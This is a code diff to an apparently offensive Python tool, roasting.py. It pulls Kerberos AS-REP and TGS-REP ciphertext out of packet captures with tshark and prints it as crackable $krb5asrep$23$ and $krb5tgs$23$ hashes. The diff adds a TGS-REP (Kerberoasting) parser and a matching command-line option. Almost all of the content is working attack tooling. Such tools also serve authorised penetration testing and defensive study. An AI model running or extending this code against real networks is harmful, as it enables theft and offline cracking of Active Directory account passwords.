@@ -86,9 +86,50 @@ def parse_asrep_packets(pcap_file: str) -> List[Tuple[str, str, str, str]]:
                 cipher_parts = cipher.split(",")  # AS-REP packets contain two ciphers: one for the ticket and one for the session key
                 if len(cipher_parts) > 1:
                     session_key_cipher = cipher_parts[1]
-                    first_16_bytes = session_key_cipher[:32]  # 32 hex chars = 16 bytes
-                    remaining_bytes = session_key_cipher[32:]
-                    parsed_results.append((username, domain, first_16_bytes, remaining_bytes))
+                    ticket_checksum = session_key_cipher[:32]  # 32 hex chars = 16 bytes
+                    ticket_enc_data = session_key_cipher[32:]
+                    parsed_results.append((username, domain, ticket_checksum, ticket_enc_data))
+            except:
+                continue
+
+    return parsed_results
+
+
+def parse_tgsrep_packets(pcap_file: str) -> List[Tuple[str, str, str, str, str]]:
+    tshark_cmd = [
+        "tshark",
+        "-r",
+        pcap_file,
+        "-Y",
+        "kerberos.msg_type == 13 && kerberos.CNameString && kerberos.realm && kerberos.SNameString && kerberos.cipher",
+        "-T",
+        "fields",
+        "-e",
+        "kerberos.CNameString",
+        "-e",
+        "kerberos.realm",
+        "-e",
+        "kerberos.SNameString",
+        "-e",
+        "kerberos.cipher",
+        "-E",
+        "separator=$",
+    ]
+
+    result = subprocess.run(tshark_cmd, capture_output=True, text=True, check=True)
+    parsed_results = []
+    for line in result.stdout.strip().split("\n"):
+        if line:
+            try:
+                username, domain, spn, cipher = line.split("$")
+                spn_parts = spn.split(",")
+                cipher_parts = cipher.split(",")  # TGS-REP packets contain two ciphers: one for the ticket and one for the session key
+                if len(spn_parts) > 1 and len(cipher_parts) > 1:
+                    spn = spn.replace(",", "/")
+                    ticket_cipher = cipher_parts[0]
+                    ticket_checksum = ticket_cipher[:32]  # 32 hex chars = 16 bytes
+                    ticket_enc_data = ticket_cipher[32:]
+                    parsed_results.append((username, domain, spn, ticket_checksum, ticket_enc_data))
             except:
                 continue
 
@@ -97,7 +138,7 @@ def parse_asrep_packets(pcap_file: str) -> List[Tuple[str, str, str, str]]:
 
 def main():
     if len(sys.argv) != 3:
-        print("Usage: python roasting.py <pcap_file> <as_req/as_rep>", file=sys.stderr)
+        print("Usage: python roasting.py <pcap_file> <as_req/as_rep/tgs_rep>", file=sys.stderr)
         sys.exit(1)
 
     pcap_file = sys.argv[1]
@@ -110,11 +151,16 @@ def main():
 
     elif roast_type == "as_rep":
         fields = parse_asrep_packets(pcap_file)
-        for username, domain, first_16, remaining in fields:
-            print(f"$krb5asrep$23${username}@{domain}:{first_16}${remaining}")
+        for username, domain, ticket_checksum, ticket_enc_data in fields:
+            print(f"$krb5asrep$23${username}@{domain}:{ticket_checksum}${ticket_enc_data}")
+
+    elif roast_type == "tgs_rep":
+        fields = parse_tgsrep_packets(pcap_file)
+        for username, domain, spn, ticket_checksum, ticket_enc_data in fields:
+            print(f"$krb5tgs$23$*{username}${domain}${spn}*${ticket_checksum}${ticket_enc_data}")
 
     else:
-        print("Error: Second argument must be either 'as_req' or 'as_rep'", file=sys.stderr)
+        print("Error: Second argument must be either 'as_req', 'as_rep' or 'tgs_rep'", file=sys.stderr)
         sys.exit(1)
 
 
